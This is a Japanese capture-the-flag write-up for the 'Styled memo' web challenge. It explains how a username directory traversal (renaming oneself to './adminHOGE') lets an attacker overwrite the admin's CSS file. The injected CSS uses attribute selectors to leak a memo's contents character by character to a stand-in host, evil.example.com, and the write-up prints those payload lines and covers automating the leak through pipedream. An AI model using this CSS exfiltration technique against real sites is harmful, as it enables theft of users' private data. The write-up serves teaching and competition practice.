---
title: "Styled memo"
level: 5
flag: "FLAG{CSS_Injecti0n_us1ng_d1r3ctory_tr@versal}"
writer: "suuhito"
badge: true
---

# Styled memo

## 問題文
CSSをアップロードすることで見た目を調整可能なメモアプリです！

<https://styled-memo.web.wanictf.org/>

## 解法
### アプリに関して
* 謎のCSSアップロード機能が付いたメモアプリです。
* ログインユーザが自分のメモのみを閲覧することができます。(`django/app/memo/views.py`の12行目)
* メモ機能としては、一覧、新規作成、編集機能が付いています。
* ユーザ修正機能が付いており、ユーザ名とメモ用CSSを変更することができます。
* 一覧画面で自分が登録したCSSが読み込まれます(`django/app/memo/templates/list.html`の5行目)

### FLAGの場所
* ユーザ登録を済ませると、「説明」というタイトルのメモが表示されています。詳細を確認してみると、`username: adminHOGEがFLAGを持っているようです`のように表示されます。
* このメモを作成する処理を確認してみます。`がFLAGを持っているようです`で検索すると、`django/app/master/views.py`の`form_valid`メソッドで行われています。
* `form_valid`メソッドでは、ユーザ登録画面で送信されたデータに問題がない場合の処理が書かれています。説明メモの作成のほかには、`admin`の作成と`admin`に対してFLAGが`content`に記述されたメモを追加する処理が行われています。
* よって、攻撃者はこのメモの情報をどうにかして入手する必要があります。
* メモ一覧画面のテンプレート(`django/app/memo/templates/list.html`)を確認してみると、34行目で`button`の`data-content`属性に`memo.content`が書かれていることが分かります。すなわち`admin`がメモ一覧画面を表示した際には、HTMLのbuttonタグの属性部分にFLAGが存在することになります。

### CSS Injection
* CSSアップロード機能があることと、FLAGがHTMLタグの属性に書かれていることから、`CSS Injection`による攻撃を検討します。
* `CSS Injection`による攻撃の基本例としては、例えば`adminHOGE`に対して任意のCSSを注入できる状況で、以下のようなCSSを注入した場合を考えます。
* `adminHOGE`がメモ一覧画面を開く際には、`.btn-memo-detail`クラスが適用されている`button`タグの`data-content`属性は`FLAG{...}`となっています。
* ブラウザがスタイル適用処理を行う際に`data-content`属性を確認し、先頭が`F`であることから`http://evil.example.com/?flag=F`にリクエストが発生し、`evil.example.com`の持ち主はFLAGの先頭が`F`であることを知ることができます。
* 二文字目以降も`data-content^="Fa"`のようにすることで判別可能です。
```
.btn-memo-detail[data-content^="a"]{background:url(http://evil.example.com/?flag=a)}
.btn-memo-detail[data-content^="b"]{background:url(http://evil.example.com/?flag=b)}
...
.btn-memo-detail[data-content^="F"]{background:url(http://evil.example.com/?flag=F)}
...
```

### CSSの注入
* しかし、CSSを`admin`に対して注入する方法がなければこの攻撃を行うことができません。
* 怪しいCSSアップロード機能を確認します。CSSのアップロード先の指定などは、`django/app/master/models.py`に記述されています。アップロード先は`get_upload_to`関数によって制御されており、そこではユーザ名のディレクトリ以下にファイルを保存すると書かれています。
* よって、ユーザ名かファイル名のどちらかを細工することでディレクトリトラバーサルを起こし、`admin`と同じディレクトリにCSSをアップロードできないか検討します。
* djangoのバージョンを確認すると、`2.2.20`に固定されています。実はこのバージョンではファイル名によってディレクトリトラバーサルを引き起こすことができるかもしれない問題を[修正](https://docs.djangoproject.com/en/3.2/releases/2.2.20/)しているため、ファイル名を用いるのは難しそうです。
* ユーザ修正機能にはユーザ名の修正機能もついているため、自分のユーザ名を`./admin`のようにすることができれば、`admin`と同じディレクトリにCSSをアップロードすることができそうです。これもdjangoの内部処理によってできるかどうかは変わりませんが、試しにやってみるとできてしまいます！
* ユーザに紐づく`css`にはデフォルト値が存在しており、`example.css`となっています。つまり、例えば`username: adminHOGE`は`css/adminHOGE/example.css`を読み込むようになっています。よって、適当な名前のCSSファイルを`adminHOGE`と同じディレクトリにアップロードすればいいわけではなく、`example.css`という名前でなければならないようです。しかし、20行目あたりを見ると同一ファイル名だった場合は上書きするといった処理が行われるように記述されているため、気にせず`example.css`という名前でファイルをアップロードしましょう。
* 試しに自分のユーザ名を`./adminHOGE`にし、適当な`example.css`をアップロードしてからメモ一覧画面を見ると、`css/adminHOGE/example.css`がブラウザに読み込まれているのを確認できると思います。

### 攻撃
* よって、適当なユーザを作成して攻撃対象のユーザ名を確認し(`adminHOGE`とする)、ユーザ修正機能によって自分のユーザ名を`./adminHOGE`として上で説明したようなCSS(evil.example.comは自分のサーバに変更すること)をアップロードすることで、`adminHOGE`にFLAGを奪えるようなCSSを注入できました。
* この攻撃を成功させるためには、リクエストを受け取るサーバが必要です、自分で建てるのはめんどくさいので、[pipedream](https://pipedream.com)のようなサービスを利用するのをお勧めします。pipedreamはAPIがあるため、攻撃を自動化することも可能です。
* リクエストを受け取るサーバの準備も整い、`adminHOGE`に対してFLAGを奪えるようなCSSを注入できたので、後は`adminHOGE`がメモを見るのを待つのみなのですが、この問題には「adminHOGEにadminHOGEのメモを確認してもらう」ボタンがあるため、これを押すと`adminHOGE`がメモ一覧にアクセスし、リクエストがサーバに飛んできます。頑張って一文字ずつFLAGを盗み出しましょう！

### solverについて
* `solver/solver.py`ではpipedreamを使用しています。簡単にsolverの使い方を説明しておきます。
  * pipedreamのアカウントを作成してログインします。
  * 右のメニューから`Sources`を選択して`new`を選択し、`HTTP / Webhook`を選択してその後はそのままで`sources`を作成します。
  * 作成したsourcesの画面に移動し、`Your endpoint is`以降のurlを`PIPEDREAM_ENDPOINT`に記述します。
  * URLの`https://pipedream.com/sources/xxxxxx`の`xxxxxx`の部分を`PIPEDREAM_SOURCE_ID`に記述します。
  * 右のメニューから`Settings`を選択して`Programmatic Access`を押すと`API Key`が得られるので`PIPEDREAM_API_KEY`に記述します。
  * `APP_ORIGIN`にstyled-memoのurlを設定します。
  * 実行!
